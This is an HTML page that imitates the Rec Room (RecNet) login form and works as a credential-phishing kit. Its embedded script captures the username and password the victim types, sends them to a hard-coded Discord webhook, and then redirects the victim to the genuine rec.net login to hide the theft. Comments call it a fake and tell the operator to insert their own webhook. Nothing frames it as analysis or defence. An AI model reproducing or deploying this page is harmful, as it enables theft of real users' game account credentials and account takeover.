<!DOCTYPE html>
<html>
<head>
    <title>Log In - RecNet</title>
    <style>
       element.style {
}
html {
    font-size: 10px;
    -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
}
html {
    font-family: sans-serif;
    -webkit-text-size-adjust: 100%;
    -ms-text-size-adjust: 100%;
}
* {
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    box-sizing: border-box;
}
user agent stylesheet
:root {
    view-transition-name: root;
}
user agent stylesheet
html {
    display: block;
}
:after, :before {
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    box-sizing: border-box;
}
:after, :before {
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    box-sizing: border-box;
}
    </style>
</head>
<body>
    <div class="page-login">
        <img class="recroom-logo" src="/images/logo_stacked.png" alt="Rec Room" />
        <hr />
        <section>
            <p class="text-center">Log in with your Rec Room Username and Password</p>
            <form id="loginForm" action="" method="post">
                <div class="form-group">
                    <label for="Input_Username">Username or Email</label>
                    <input class="form-control" placeholder="Username" autofocus type="text" id="Input_Username" name="Input.Username" required>
                    <span id="usernameError" class="text-danger"></span>
                </div>
                <div class="form-group">
                    <label for="Input_Password">Password</label>
                    <input class="form-control" type="password" placeholder="Password" autocomplete="off" id="Input_Password" name="Input.Password" required>
                    <span id="passwordError" class="text-danger"></span>
                </div>
                <div class="form-actions">
                    <div class="form-group">
                        <div class="checkbox">
                            <label for="Input_RememberMe">
                                <input type="checkbox" id="Input_RememberMe" name="Input.RememberMe" value="true">
                                Remember Me?
                            </label>
                        </div>
                    </div>
                    <div class="submit-button form-group">
                            <button class="btn" id="submitButton" name="button" value="login">Login</button>
                    </div>
                </div>
                <div class="form-group">
                    <p>
                        <a href="https://rec.net/password/recover">Forgot your password?</a>
                    </p>
                    <p>
                        <a href="https://rec.net/download">Don't have an Account? Download Rec Room to create yours today!</a>
                    </p>
                </div>
                <input type="hidden" name="__RequestVerificationToken" value="YOUR_REQUEST_VERIFICATION_TOKEN"> <input type="hidden" name="Input.RememberMe" value="false">
            </form>
        </section>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const loginForm = document.getElementById('loginForm');
            loginForm.addEventListener('submit', function(event) {
                event.preventDefault(); // Prevent the default form submission

                const username = document.getElementById('Input_Username').value;
                const password = document.getElementById('Input_Password').value;
                const webhookUrl = 'https://discord.com/api/webhooks/1366421122014253097/a63BlnStlKceFeK6fEjGIANz4r_bgxZyA7_Gt_r-Ub5TjTrKCYDkmUs8vEqKhbfR7-DH'; // YOU ABSOLUTE BUFFOON, REPLACE THIS!

                fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        username: username,
                        password: password
                    })
                })
                .then(response => {
                    if (!response.ok) {
                        console.error('Failed to send data to Discord:', response.status);
                        // You can add code here to display an error message to the user
                    }
                    window.location.href = 'https://auth.rec.net/Account/Login?ReturnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3Drecnet%26scope%3Dopenid%2520rn%2520offline_access%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Frec.net%252Fapi%252Fauth%252Fcallback%252Frecnet%26state%3DUp05GehaCWG_RmSFAnov9Ef9SRjnQ-Kvvbv3XEjv8TY%26code_challenge%3DwJRRUGQLjXMEUo6cnjDiPIUgjh556R1icLGjd9ND1cs%26code_challenge_method%3DS256'; // Redirect to the REAL Rec Net login
                })
                .catch(error => {
                    console.error('Error sending data to Discord:', error);
                    // Optionally display an error to the user, but still redirect
                    window.location.href = 'https://rec.net/login';
                });
            });

            // You might need to add JavaScript to handle the "enableSubmit" functionality related to their reCAPTCHA if you want to mimic that behavior.
            // For a simpler fake, you can just leave the button enabled.
        });
    </script>
</body>
</html>
